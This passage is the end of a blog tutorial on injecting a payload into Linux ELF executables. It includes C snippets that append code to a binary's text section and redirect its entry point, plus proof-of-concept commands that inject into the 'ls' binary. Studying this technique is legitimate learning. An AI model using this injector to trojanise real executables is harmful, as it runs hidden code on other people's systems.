+</span></span><span style="display:flex;"><span>		perror(<span style="color:#e6db74">&#34;[!] Payload to big to inject.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>		close(target_fd);
+</span></span><span style="display:flex;"><span>		close(payload_fd);
+</span></span><span style="display:flex;"><span>		exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Inject payload
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	memmove(data <span style="color:#f92672">+</span> txt_end, data1 <span style="color:#f92672">+</span> p_txt_sec_ptr<span style="color:#f92672">-&gt;</span>sh_offset, p_txt_sec_ptr<span style="color:#f92672">-&gt;</span>sh_size);
+</span></span></code></pre></div><h2 id="finishing-it-up">Finishing it up<a href="#finishing-it-up" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Finally, with a little help of pointer dancing and the <code>patch_target</code> function, we can change the entry point of the file with the evil one and replace the placeholder with the original entry point. I will not include the code here since this is basically just scanning the whole code of the payload, searching for the pattern passed by the second argument and replacing it with the entry point passed by the 4th argument.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Patch the return address after executing the payload
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>patch_target(data <span style="color:#f92672">+</span> txt_end, <span style="color:#ae81ff">0x1111111111111111</span>, p_txt_sec_ptr<span style="color:#f92672">-&gt;</span>sh_size, (<span style="color:#66d9ef">long</span>)e_point);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Change entry point
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>elf_header<span style="color:#f92672">-&gt;</span>e_entry <span style="color:#f92672">=</span> (Elf64_Addr)(base <span style="color:#f92672">+</span> txt_end);
+</span></span></code></pre></div><h1 id="proof-of-concept">Proof of concept<a href="#proof-of-concept" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<ol>
+<li>Just compile the elf injector like any other normal C program: <code>gcc elf_inejctor.c -o elf</code></li>
+<li>Generate the payload: <code>nasm -f elf64 -o payload.o payload.asm &amp;&amp; ld -o payload payload.o</code></li>
+<li>RUN IT!: <code>./elf ls payload</code></li>
+</ol>
+<blockquote>
+<p><strong>NOTE</strong>: If you want to inspect the code more carefully you can check it <a href="https://github.com/vlagh3/elij">@ my github</a> as always</p>
+</blockquote>
+<h1 id="final-words">Final words<a href="#final-words" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>In this article I have shown you a simple way of executing arbitrary code on an ELF file by injecting it.
+I hope you enjoyed and now you can see how many things you can do if you master the ELF file structure.
+I will come back with more things on ELF files because I have some ideas for the future. Until then, think of your own implementations!
+Thank you for reading, and I will see you next time !</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://vlaghe.github.io/posts/python-vm/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Python internals for fun (&amp; profit?)</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://vlaghe.github.io/posts/elf_struct/">
+                <span class="button__text">Exploring the ELF file structure</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://vlaghe.github.io/assets/main.js"></script>
+<script src="https://vlaghe.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
